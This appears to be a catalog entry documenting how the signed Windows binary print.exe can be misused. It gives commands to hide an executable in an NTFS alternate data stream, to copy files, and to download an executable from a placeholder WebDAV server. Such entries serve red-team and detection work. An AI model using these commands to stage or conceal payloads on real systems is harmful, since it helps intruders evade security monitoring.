---
Name: Print.exe
Description: Download, Copy, Add ADS
Author: ''
Created: '2018-05-25'
Categories: []
Commands:
  - Command: |
          print /D:C:\ADS\File.txt:file.exe C:\ADS\File.exe
          print /D:C:\ADS\CopyOfFile.exe C:\ADS\FileToCopy.exe
          print /D:C:\OutFolder\outfile.exe \\WebDavServer\Folder\File.exe
    Description: ''
Full Path:
  - C:\Windows\System32\print.exe
  - C:\Windows\SysWOW64\print.exe
Code Sample: []
Detection: []
Resources:
  - https://twitter.com/Oddvarmoe/status/985518877076541440
  - https://www.youtube.com/watch?v=nPBcSP8M7KE&lc=z22fg1cbdkabdf3x404t1aokgwd2zxasf2j3rbozrswnrk0h00410
Notes: Thanks to Oddvar Moe - @oddvarmoe
---